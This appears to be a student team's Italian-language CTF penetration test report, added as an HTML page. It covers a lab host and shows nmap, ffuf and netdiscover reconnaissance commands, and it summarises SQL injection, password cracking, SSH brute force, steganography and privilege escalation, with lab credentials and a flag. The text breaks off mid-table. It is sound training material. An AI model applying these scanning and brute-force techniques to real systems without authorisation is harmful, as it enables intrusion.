@@ -1,0 +1,1315 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DIGITAL AVENGERS — Black Box CTF Report</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,800;1,9..144,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #08090d;
+  --bg-alt: #0e1017;
+  --surface: #12141c;
+  --card: #181b26;
+  --border: #1f2333;
+  --border-lit: #2a2f42;
+  --accent: #00ff88;
+  --accent-dim: #00c96b;
+  --accent-ghost: rgba(0,255,136,0.06);
+  --cyan: #38bdf8;
+  --red: #ef4444;
+  --amber: #f59e0b;
+  --purple: #a78bfa;
+  --gold: #d4a574;
+  --text: #c8c5ba;
+  --text-bright: #eae8e1;
+  --muted: #6b6f7e;
+  --dim: #3d4152;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Fraunces', Georgia, serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.75;
+  font-size: 17px;
+  overflow-x: hidden;
+}
+
+code, pre, .mono, .tag, .badge, .toc, nav, .section-num, .cover-top, .cover-bottom,
+footer, .screenshot-slot .label, .table-wrap th, .risk-score, .status-chip {
+  font-family: 'JetBrains Mono', 'Courier New', monospace;
+}
+
+::selection { background: rgba(0,255,136,0.25); color: #fff; }
+
+/* ─── SCANLINES + GRID OVERLAY ─── */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  z-index: 9999;
+  background:
+    repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+  mix-blend-mode: multiply;
+}
+
+/* ─── SCROLLBAR ─── */
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border-lit); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--accent-dim); }
+
+/* ════════════════════════════════════
+   COVER
+   ════════════════════════════════════ */
+.cover {
+  min-height: 100vh;
+  padding: 50px 8vw 60px;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  position: relative;
+  background:
+    radial-gradient(ellipse at 20% 20%, rgba(0,255,136,0.07), transparent 55%),
+    radial-gradient(ellipse at 80% 80%, rgba(239,68,68,0.04), transparent 55%),
+    var(--bg);
+  border-bottom: 1px solid var(--border);
+}
+.cover::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+  background-size: 44px 44px;
+  pointer-events: none;
+}
+
+.cover-top {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 11px;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--accent);
+  z-index: 1;
+}
+.cover-top .tag {
+  padding: 5px 14px;
+  border: 1px solid var(--accent);
+  border-radius: 2px;
+  font-weight: 700;
+}
+.cover-top .classified {
+  color: var(--red);
+  font-weight: 700;
+}
+
+.cover-title {
+  z-index: 1;
+  margin: auto 0;
+  padding: 40px 0;
+}
+.cover-title h1 {
+  font-size: clamp(42px, 8vw, 110px);
+  line-height: 0.95;
+  font-weight: 800;
+  letter-spacing: -0.03em;
+  color: var(--text-bright);
+}
+.cover-title h1 em {
+  font-style: italic;
+  font-weight: 400;
+  color: var(--accent);
+}
+.cover-title .dek {
+  font-size: clamp(16px, 1.8vw, 22px);
+  color: var(--muted);
+  max-width: 660px;
+  margin-top: 24px;
+  font-style: italic;
+  border-left: 3px solid var(--accent);
+  padding-left: 20px;
+  line-height: 1.6;
+}
+
+.cover-info {
+  z-index: 1;
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 20px;
+  padding-top: 30px;
+  border-top: 1px solid var(--border);
+}
+.cover-info-item .label {
+  font-size: 10px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--accent);
+  font-weight: 700;
+  margin-bottom: 4px;
+}
+.cover-info-item .value {
+  font-size: 14px;
+  color: var(--text-bright);
+  font-family: 'Fraunces', serif;
+}
+.cover-info-item .value.members {
+  font-size: 12px;
+  color: var(--text);
+  line-height: 1.8;
+}
+
+/* ════════════════════════════════════
+   NAVIGATION / TOC
+   ════════════════════════════════════ */
+nav.toc {
+  padding: 70px 8vw;
+  background: var(--bg-alt);
+  border-bottom: 1px solid var(--border);
+}
+nav.toc h2 {
+  font-size: 11px;
+  letter-spacing: 0.3em;
+  text-transform: uppercase;
+  color: var(--accent);
+  margin-bottom: 28px;
+  font-weight: 700;
+}
+nav.toc ol {
+  list-style: none;
+  counter-reset: toc-c;
+}
+nav.toc li {
+  counter-increment: toc-c;
+  border-bottom: 1px solid var(--border);
+  transition: all 0.2s;
+}
+nav.toc li:hover { border-color: var(--accent); }
+nav.toc li a {
+  display: flex;
+  align-items: baseline;
+  gap: 20px;
+  padding: 16px 0;
+  color: var(--text);
+  text-decoration: none;
+  font-size: 18px;
+  font-weight: 600;
+  letter-spacing: -0.01em;
+  transition: color 0.2s;
+}
+nav.toc li:hover a { color: var(--accent); }
+nav.toc li a::before {
+  content: "0" counter(toc-c);
+  font-size: 13px;
+  color: var(--dim);
+  min-width: 36px;
+  transition: color 0.2s;
+}
+nav.toc li:hover a::before { color: var(--accent); }
+
+/* ════════════════════════════════════
+   SECTIONS / CHAPTERS
+   ════════════════════════════════════ */
+.section {
+  padding: 90px 8vw;
+  max-width: 1400px;
+  margin: 0 auto;
+  border-bottom: 1px solid var(--border);
+}
+.section-num {
+  font-size: 11px;
+  letter-spacing: 0.3em;
+  text-transform: uppercase;
+  color: var(--accent);
+  font-weight: 700;
+  margin-bottom: 14px;
+}
+.section > h2 {
+  font-size: clamp(30px, 4.5vw, 54px);
+  line-height: 1.08;
+  font-weight: 800;
+  letter-spacing: -0.025em;
+  color: var(--text-bright);
+  margin-bottom: 36px;
+  max-width: 900px;
+}
+.section > h2 em { color: var(--accent); font-style: italic; font-weight: 400; }
+
+.section h3 {
+  font-size: 22px;
+  font-weight: 600;
+  color: #fff;
+  margin: 36px 0 14px;
+  letter-spacing: -0.01em;
+}
+.section h3 .cyan { color: var(--cyan); }
+
+.section h4 {
+  font-size: 16px;
+  font-weight: 600;
+  color: var(--cyan);
+  margin: 28px 0 10px;
+  font-family: 'JetBrains Mono', monospace;
+  letter-spacing: 0.02em;
+}
+
+.section p {
+  font-size: 17px;
+  line-height: 1.8;
+  margin-bottom: 18px;
+  max-width: 760px;
+  color: var(--text);
+}
+.section p strong { color: var(--text-bright); font-weight: 600; }
+.section p em { color: var(--accent); font-style: italic; }
+
+.section ul, .section ol {
+  max-width: 760px;
+  margin-bottom: 18px;
+  padding-left: 22px;
+}
+.section li {
+  margin-bottom: 8px;
+  line-height: 1.7;
+  color: var(--text);
+}
+.section li strong { color: var(--text-bright); }
+
+/* ─── INLINE CODE ─── */
+code:not(pre code) {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  padding: 2px 7px;
+  border-radius: 3px;
+  font-size: 0.82em;
+  color: var(--accent);
+}
+
+/* ─── CODE BLOCKS ─── */
+pre {
+  background: #000;
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--accent);
+  padding: 18px 22px;
+  margin: 20px 0;
+  overflow-x: auto;
+  font-size: 13px;
+  line-height: 1.65;
+  color: var(--accent);
+  border-radius: 2px;
+  max-width: 900px;
+  position: relative;
+}
+pre[data-label]::before {
+  content: attr(data-label);
+  position: absolute;
+  top: -9px;
+  left: 14px;
+  background: var(--bg);
+  padding: 0 8px;
+  font-size: 10px;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  color: var(--dim);
+}
+pre.danger { border-left-color: var(--red); color: var(--red); }
+pre.amber { border-left-color: var(--amber); color: var(--amber); }
+
+/* ─── SPECIAL BOXES ─── */
+.box {
+  padding: 24px 28px;
+  margin: 28px 0;
+  border-radius: 4px;
+  max-width: 780px;
+}
+.box::before {
+  display: block;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  margin-bottom: 10px;
+  font-weight: 700;
+}
+.box p { font-size: 15px; max-width: 100%; margin-bottom: 8px; }
+.box p:last-child { margin-bottom: 0; }
+
+.box.tip {
+  background: rgba(0,255,136,0.04);
+  border: 1px solid rgba(0,255,136,0.2);
+}
+.box.tip::before { content: "💡 Key Finding"; color: var(--accent); }
+.box.tip p { color: #c4e8d2; }
+
+.box.danger {
+  background: rgba(239,68,68,0.05);
+  border: 1px solid rgba(239,68,68,0.25);
+}
+.box.danger::before { content: "⚠️ Rischio Critico"; color: var(--red); }
+.box.danger p { color: #f0d4d4; }
+
+.box.info {
+  background: rgba(56,189,248,0.04);
+  border: 1px solid rgba(56,189,248,0.2);
+}
+.box.info::before { content: "📋 Nota Operativa"; color: var(--cyan); }
+.box.info p { color: #c4ddf0; }
+
+.box.phase {
+  background: linear-gradient(135deg, rgba(167,139,250,0.05), rgba(167,139,250,0.01));
+  border: 1px solid rgba(167,139,250,0.2);
+  border-left: 4px solid var(--purple);
+}
+.box.phase::before { color: var(--purple); }
+.box.phase p { color: #ddd5f0; }
+
+/* ─── TABLES ─── */
+.table-wrap {
+  overflow-x: auto;
+  margin: 24px 0;
+  max-width: 920px;
+}
+.table-wrap table {
+  width: 100%;
+  border-collapse: collapse;
+  background: var(--surface);
+  border-radius: 4px;
+  overflow: hidden;
+}
+.table-wrap th {
+  background: #000;
+  color: var(--accent);
+  font-size: 11px;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  font-weight: 700;
+  padding: 12px 16px;
+  text-align: left;
+  border-bottom: 2px solid var(--border);
+}
+.table-wrap td {
+  padding: 11px 16px;
+  border-bottom: 1px solid var(--border);
+  font-size: 14px;
+  color: var(--text);
+  vertical-align: top;
+}
+.table-wrap tr:nth-child(even) { background: var(--bg-alt); }
+.table-wrap tr:hover { background: var(--card); }
+.table-wrap td.mono {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: var(--accent);
+}
+.table-wrap td.red { color: var(--red); font-weight: 700; }
+.table-wrap td.amber { color: var(--amber); font-weight: 700; }
+.table-wrap td.green { color: var(--accent); font-weight: 700; }
+
+/* ─── STATUS CHIPS ─── */
+.status-chip {
+  display: inline-block;
+  padding: 2px 10px;
+  border-radius: 2px;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.05em;
+}
+.status-chip.done { background: rgba(0,255,136,0.12); color: var(--accent); border: 1px solid rgba(0,255,136,0.3); }
+.status-chip.crit { background: rgba(239,68,68,0.12); color: var(--red); border: 1px solid rgba(239,68,68,0.3); }
+.status-chip.high { background: rgba(245,158,11,0.12); color: var(--amber); border: 1px solid rgba(245,158,11,0.3); }
+.status-chip.med { background: rgba(56,189,248,0.12); color: var(--cyan); border: 1px solid rgba(56,189,248,0.3); }
+
+/* ─── SCREENSHOT SLOTS ─── */
+.screenshot-slot {
+  background: var(--surface);
+  border: 2px dashed var(--border-lit);
+  padding: 40px 30px;
+  text-align: center;
+  margin: 28px 0;
+  border-radius: 4px;
+  max-width: 900px;
+  min-height: 300px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  transition: border-color 0.3s;
+}
+.screenshot-slot:hover { border-color: var(--accent-dim); }
+.screenshot-slot .label {
+  font-size: 10px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--dim);
+  margin-bottom: 10px;
+}
+.screenshot-slot .title {
+  font-size: 18px;
+  font-weight: 600;
+  color: var(--muted);
+  font-family: 'Fraunces', serif;
+}
+.screenshot-slot .hint {
+  font-size: 12px;
+  color: var(--dim);
+  margin-top: 8px;
+  font-style: italic;
+}
+
+/* Screenshot placed */
+.screenshot-slot img {
+  max-width: 100%;
+  border: 1px solid var(--border);
+  border-radius: 3px;
+}
+.screenshot-slot .caption {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--dim);
+  margin-top: 10px;
+}
+
+/* ─── PHASE GRID ─── */
+.phase-grid {
+  display: grid;
+  grid-template-columns: 64px 1fr;
+  gap: 24px;
+  margin: 28px 0;
+  max-width: 860px;
+}
+.phase-grid .num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 36px;
+  font-weight: 700;
+  color: var(--accent);
+  line-height: 1;
+}
+.phase-grid h4 {
+  margin-top: 0;
+  font-size: 18px;
+  font-weight: 600;
+  color: #fff;
+  font-family: 'Fraunces', serif;
+}
+.phase-grid p { max-width: 100%; }
+
+/* ════════════════════════════════════
+   FOOTER
+   ════════════════════════════════════ */
+footer {
+  padding: 36px 8vw;
+  border-top: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--dim);
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 16px;
+}
+footer .classified { color: var(--red); }
+
+/* ════════════════════════════════════
+   RESPONSIVE
+   ════════════════════════════════════ */
+@media (max-width: 768px) {
+  .section, nav.toc { padding: 50px 6vw; }
+  .cover { padding: 30px 6vw 40px; }
+  .cover-info { grid-template-columns: 1fr 1fr; }
+  .phase-grid { grid-template-columns: 1fr; gap: 8px; }
+  .phase-grid .num { font-size: 28px; }
+}
+
+/* ─── ANIMATIONS ─── */
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+.section { animation: fadeUp 0.6s ease-out; }
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════
+     COVER
+     ══════════════════════════════════════ -->
+<section class="cover">
+  <div class="cover-top">
+    <span class="tag">■ Cyber Build Week · Report</span>
+    <span class="classified">CLASSIFICATION: CONFIDENTIAL</span>
+  </div>
+
+  <div class="cover-title">
+    <h1>Enterprise<br>Security<br><em>Report</em></h1>
+    <p class="dek">
+      Penetration test completo su target Black Box. Dalla ricognizione alla root flag, 
+      passando per SQL Injection, steganografia, Port Knocking e privilege escalation.
+    </p>
+  </div>
+
+  <div class="cover-info">
+    <div class="cover-info-item">
+      <div class="label">Task</div>
+      <div class="value">Bonus Giorno 3 — Epicode Black Box CTF 2</div>
+    </div>
+    <div class="cover-info-item">
+      <div class="label">Team</div>
+      <div class="value">DIGITAL AVENGERS</div>
+    </div>
+    <div class="cover-info-item">
+      <div class="label">Versione</div>
+      <div class="value">1.0</div>
+    </div>
+    <div class="cover-info-item">
+      <div class="label">Classificazione</div>
+      <div class="value" style="color: var(--red);">CONFIDENTIAL</div>
+    </div>
+    <div class="cover-info-item" style="grid-column: 1 / -1;">
+      <div class="label">Membri Team</div>
+      <div class="value members">
+        Lorenzo Petrucci · Christian Koscielniak Pinto · Gabriele Chinnici · 
+        Wafa Saghir · Amy Antonella Acosta Hugo · Domenico Mendola · Corrado Vaccarecci
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════
+     TOC
+     ══════════════════════════════════════ -->
+<nav class="toc">
+  <h2>Indice del Documento</h2>
+  <ol>
+    <li><a href="#s1">Executive Summary</a></li>
+    <li><a href="#s2">Descrizione del Task</a></li>
+    <li><a href="#s3">Obiettivi (Main & Bonus)</a></li>
+    <li><a href="#s4">Threat Model & Risk Assessment</a></li>
+    <li><a href="#s5">Processo Operativo Completo</a></li>
+    <li><a href="#s6">Tool, Tecnologie & Ambiente</a></li>
+    <li><a href="#s7">MITRE ATT&CK Mapping</a></li>
+    <li><a href="#s8">IOC & Artefatti Raccolti</a></li>
+    <li><a href="#s9">Lessons Learned & Mitigazioni</a></li>
+    <li><a href="#s10">Riferimenti & Appendici</a></li>
+  </ol>
+</nav>
+
+<!-- ══════════════════════════════════════
+     1 · EXECUTIVE SUMMARY
+     ══════════════════════════════════════ -->
+<article class="section" id="s1">
+  <div class="section-num">Sezione 01</div>
+  <h2>Executive <em>Summary</em></h2>
+
+  <h3>Contesto</h3>
+  <p>Il team Digital Avengers ha affrontato il task bonus del Giorno 3 della Build Week Epicode: una CTF (Capture The Flag) di tipo <strong>Black Box</strong> su un host virtuale (<code>192.168.0.10</code>). Lo scenario simula un penetration test realistico con accesso zero-knowledge, il cui obiettivo finale era ottenere privilegi root e catturare la flag conclusiva. Tutti i test sono stati condotti in <em>ambiente di laboratorio autorizzato</em>.</p>
+
+  <h3>Obiettivo Principale</h3>
+  <p>Compromettere completamente il sistema target attraverso una catena di vulnerabilità — recon, web exploitation (SQLi), analisi steganografica, Port Knocking, movimento laterale e privilege escalation — fino all'acquisizione della <strong>root flag</strong>.</p>
+
+  <h3>Risultati Chiave</h3>
+  <ul>
+    <li><span class="status-chip done">✔ DONE</span> Root flag acquisita: <code>FLAG{misfatto_compiuto_999_root}</code></li>
+    <li><span class="status-chip done">✔ DONE</span> SQL Injection su <code>/oldsite/login.php</code> — dump completo credenziali DB (4 utenti, hash BCrypt)</li>
+    <li><span class="status-chip done">✔ DONE</span> Password cracking con Hashcat: <code>milena:darkprincess</code></li>
+    <li><span class="status-chip done">✔ DONE</span> Accesso SSH via brute-force Hydra: <code>user:harry</code> (porta 2222)</li>
+    <li><span class="status-chip done">✔ DONE</span> Decodifica Brainfuck e ricostruzione sequenza Port Knocking (6 porte)</li>
+    <li><span class="status-chip done">✔ DONE</span> Analisi steganografica <code>theta-logo.jpg</code> → <code>poesia.txt</code> (passphrase: <em>accio</em>)</li>
+    <li><span class="status-chip done">✔ DONE</span> Estrazione chiave RSA da <code>theta-key.jpg</code> → accesso root senza password</li>
+  </ul>
+
+  <div class="box danger">
+    <p><strong>Rischio Residuo:</strong> Il sistema presenta una catena di criticità CRITICHE: SQL Injection non mitigata, credenziali deboli, hash BCrypt con wordlist comune, dati sensibili in steganografia e Port Knocking come unica barriera pre-SSH. Priorità immediata: patch SQLi con prepared statements, rimozione dei dati sensibili dagli asset web, rotazione delle chiavi SSH e implementazione di autenticazione MFA.</p>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     2 · DESCRIZIONE DEL TASK
+     ══════════════════════════════════════ -->
+<article class="section" id="s2">
+  <div class="section-num">Sezione 02</div>
+  <h2>Descrizione <em>del Task</em></h2>
+
+  <h3>2.1 Enunciato Originale</h3>
+  <p>CTF Black Box — Epicode Build Week, Giorno 3 Bonus. Target: macchina virtuale VirtualBox su rete locale (<code>192.168.0.10</code>). L'obiettivo è ottenere accesso root e catturare la flag finale attraverso l'esplorazione autonoma del sistema senza documentazione fornita.</p>
+
+  <h3>2.2 Interpretazione & Scope</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Categoria</th><th>Dettaglio</th></tr></thead>
+      <tbody>
+        <tr><td><strong>In scope</strong></td><td>Host 192.168.0.10 — tutti i servizi esposti su rete locale di laboratorio</td></tr>
+        <tr><td><strong>Out of scope</strong></td><td>Qualsiasi host diverso da 192.168.0.10; rete esterna; dati reali di terzi</td></tr>
+        <tr><td><strong>Assunzioni</strong></td><td>Ambiente di laboratorio isolato; zero-knowledge iniziale; nessun hint fornito</td></tr>
+        <tr><td><strong>Vincoli</strong></td><td>Giornata Build Week (~8h); tooling Kali Linux; no exploit 0-day fuori contesto CTF</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     3 · OBIETTIVI
+     ══════════════════════════════════════ -->
+<article class="section" id="s3">
+  <div class="section-num">Sezione 03</div>
+  <h2>Obiettivi <em>(Main & Bonus)</em></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>#</th><th>Tipo</th><th>Obiettivo</th><th>Criterio di Successo</th><th>Stato</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">M1</td><td><span class="status-chip high">MAIN</span></td><td>Recon & Enumeration</td><td>Host identificato, porte aperte mappate con Nmap</td><td class="green">✔</td></tr>
+        <tr><td class="mono">M2</td><td><span class="status-chip high">MAIN</span></td><td>Web Exploitation — SQLi</td><td>Dump completo credenziali DB via UNION-based SQLi</td><td class="green">✔</td></tr>
+        <tr><td class="mono">M3</td><td><span class="status-chip high">MAIN</span></td><td>Password Cracking</td><td>Almeno 1 hash BCrypt craccato con Hashcat</td><td class="green">✔</td></tr>
+        <tr><td class="mono">M4</td><td><span class="status-chip high">MAIN</span></td><td>SSH Access (Foothold)</td><td>Sessione interattiva come user via porta 2222</td><td class="green">✔</td></tr>
+        <tr><td class="mono">B1</td><td><span class="status-chip med">BONUS</span></td><td>Steganografia theta-logo.jpg</td><td>Estrazione poesia.txt con passphrase accio</td><td class="green">✔</td></tr>
+        <tr><td class="mono">B2</td><td><span class="status-chip med">BONUS</span></td><td>Brainfuck + Port Knocking</td><td>Porta 22 aperta dopo sequenza knock corretta</td><td class="green">✔</td></tr>
+        <tr><td class="mono">B3</td><td><span class="status-chip med">BONUS</span></td><td>Lateral Movement</td><td>Accesso a milena, luca, marco</td><td class="green">✔</td></tr>
+        <tr><td class="mono">B4</td><td><span class="status-chip med">BONUS</span></td><td>Privilege Escalation — Root</td><td>Root shell + FLAG{misfatto_compiuto_999_root}</td><td class="green">✔</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     4 · THREAT MODEL
+     ══════════════════════════════════════ -->
+<article class="section" id="s4">
+  <div class="section-num">Sezione 04</div>
+  <h2>Threat Model <em>& Risk Assessment</em></h2>
+
+  <h3>4.1 Asset & Attack Surface</h3>
+  <p>L'host <code>192.168.0.10</code> espone: server web Apache 2.4.52 (porta 80), SSH OpenSSH 8.9p1 (porta 2222, poi 22 post-knock), FTP Synology (porta 21), PPTP VPN (1723), e servizi wrappati (8080, 8443). La superficie primaria è il <strong>layer web</strong> con due applicazioni PHP (sito moderno e <code>/oldsite</code>), entrambe con form di autenticazione.</p>
+
+  <h3>4.2 Threat Actors & TTPs Ipotizzate</h3>
+  <p>Scenario simulato: attaccante esterno con accesso alla rete locale. Profilo: penetration tester intermediate-advanced. TTPs principali: T1595 (Active Scanning), T1190 (Exploit Public-Facing App), T1110.001 (Brute Force), T1078 (Valid Accounts), T1548 (Privilege Escalation).</p>
+
+  <h3>4.3 Matrice di Rischio (STRIDE / DREAD)</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Minaccia</th><th>STRIDE</th><th>Likelihood</th><th>Impact</th><th>Risk</th><th>Mitigazione</th></tr></thead>
+      <tbody>
+        <tr><td>SQL Injection /oldsite</td><td>Tampering, Info Disc.</td><td class="red">HIGH</td><td class="red">CRITICAL</td><td class="red">9.5</td><td>Prepared statements, WAF</td></tr>
+        <tr><td>Credenziali deboli (user:harry)</td><td>Elevation of Privilege</td><td class="red">HIGH</td><td class="amber">HIGH</td><td class="amber">8.5</td><td>Password policy, lockout</td></tr>
+        <tr><td>Hash BCrypt craccabile</td><td>Info Disclosure</td><td class="amber">MEDIUM</td><td class="amber">HIGH</td><td class="amber">7.0</td><td>Passphrase complesse</td></tr>
+        <tr><td>Dati sensibili in steganografia</td><td>Info Disclosure</td><td class="amber">MEDIUM</td><td class="red">CRITICAL</td><td class="red">8.0</td><td>Vault secrets, no asset web</td></tr>
+        <tr><td>Port Knocking come unica difesa</td><td>Spoofing</td><td>LOW</td><td class="amber">HIGH</td><td class="amber">5.5</td><td>MFA, certificati SSH</td></tr>
+        <tr><td>Chiave RSA root in immagine</td><td>Elevation of Privilege</td><td class="red">HIGH</td><td class="red">CRITICAL</td><td class="red">9.8</td><td>Rotazione chiavi, vault</td></tr>
+        <tr><td>Swap file con credenziali</td><td>Info Disclosure</td><td class="red">HIGH</td><td class="amber">HIGH</td><td class="amber">8.5</td><td>Shred swap files, tmpfs</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     5 · PROCESSO OPERATIVO
+     ══════════════════════════════════════ -->
+<article class="section" id="s5">
+  <div class="section-num">Sezione 05</div>
+  <h2>Processo Operativo <em>Completo</em></h2>
+
+  <h3>Approccio Metodologico</h3>
+  <p>Metodologia applicata: <strong>PTES</strong> (Penetration Testing Execution Standard) con elementi di Cyber Kill Chain e <strong>OWASP Testing Guide v4.2</strong> per il layer web. Framework di mapping: MITRE ATT&CK v14. Di seguito il processo operativo completo, fase per fase, con comandi eseguiti, risultati ottenuti ed evidenze.</p>
+
+  <!-- ── FASE 1: RICOGNIZIONE ── -->
+  <h3 style="margin-top: 50px;"><span class="cyan">FASE 1</span> — Ricognizione & Enumerazione</h3>
+
+  <h4>1.1 Identificazione Host (netdiscover)</h4>
+  <p>L'attività ha avuto inizio con l'identificazione degli host attivi all'interno del segmento di rete locale tramite richieste ARP.</p>
+  <pre data-label="Comando · netdiscover">$ sudo netdiscover -r 192.168.0.0/24</pre>
+  <p><strong>Risultato:</strong> individuato l'host target all'indirizzo IP <code>192.168.0.10</code>, identificato come macchina virtuale Oracle VirtualBox (MAC: <code>08:00:27:72:5E:0F</code>).</p>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/1.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 1.1
+	Output netdiscover — Host Discovery
+  </p>
+</div>
+
+  <h4>1.2 Analisi Nmap (SYN Stealth Scan)</h4>
+  <p>Scansione approfondita con rilevamento OS (<code>-O</code>) e versioni servizi (<code>-sV</code>).</p>
+  <pre data-label="Comando · nmap">$ nmap -sS -sV -O -T3 192.168.0.10</pre>
+
+  <p><strong>Porte aperte rilevate:</strong></p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Porta</th><th>Stato</th><th>Servizio</th><th>Versione / Note</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">21/tcp</td><td class="green">open</td><td>FTP</td><td>Synology DiskStation NAS ftpd (genera RST)</td></tr>
+        <tr><td class="mono">80/tcp</td><td class="green">open</td><td>HTTP</td><td>Apache httpd 2.4.52 (Ubuntu)</td></tr>
+        <tr><td class="mono">1723/tcp</td><td class="green">open</td><td>PPTP</td><td>Protocollo di tunneling VPN</td></tr>
+        <tr><td class="mono">2222/tcp</td><td class="green">open</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu (porta non standard)</td></tr>
+        <tr><td class="mono">8080/tcp</td><td class="green">open</td><td>HTTP</td><td>Servizio alternativo (tcpwrapped)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="box info">
+    <p><strong>Anomalia Porta 21:</strong> Nmap segnala pacchetti RST — indica possibile firewall, IPS o configurazione honeypot.</p>
+    <p><strong>SSH su porta 2222:</strong> Misura di Security through Obscurity. OS: Linux Kernel 4.x/5.x (Ubuntu).</p>
+  </div>
+
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/2.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 1.2
+	Output Nmap — SYN Scan + OS Detection
+  </p>
+</div>
+
+  <!-- ── FASE 2: WEB ENUMERATION ── -->
+  <h3 style="margin-top: 50px;"><span class="cyan">FASE 2</span> — Web Enumeration & Information Gathering</h3>
+
+  <h4>2.1 Directory Brute-Forcing (ffuf)</h4>
+  <p>Con la porta 80 aperta, l'analisi si è spostata sull'identificazione di file e directory nascoste.</p>
+  <pre data-label="Comando · ffuf">$ ffuf -u http://192.168.0.10/FUZZ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -c -ic -fc 403,404 -e .txt,.php,.html,.key,.js</pre>
+
+  <p><strong>Struttura rilevata:</strong></p>
+  <ul>
+    <li><code>/welcome.php</code> — pagina con indizio a "bella vista"</li>
+    <li><code>/images/</code> — asset grafici (theta-logo.jpg)</li>
+    <li><code>/tmp/</code> — directory con contenuto Brainfuck</li>
+    <li><code>/oldsite/</code> — versione precedente del sito</li>
+    <li><code>/oldsite/tmp/</code>, <code>/oldsite/images/</code>, <code>/oldsite/login.php</code></li>
+  </ul>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/3.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 2.1
+	ffuf — Directory Enumeration Results
+  </p>
+  </div>
+
+  <h4>2.2 Analisi dei Sorgenti e Decodifica (Brainfuck)</h4>
+  <p>Attraverso l'ispezione del codice sorgente (<code>view-source</code>) e l'analisi delle directory <code>/tmp</code>, sono stati rinvenuti diversi frammenti di codice offuscati in linguaggio <strong>Brainfuck</strong>. La loro decodifica ha permesso di ricostruire una mappatura tra numeri di porta e parole chiave, essenziale per la logica di Port Knocking.</p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Porta</th><th>Parola</th><th>Sorgente / Posizione</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">9220</td><td><strong>giuro</strong></td><td>Parametro XSS <code>?xss=</code></td></tr>
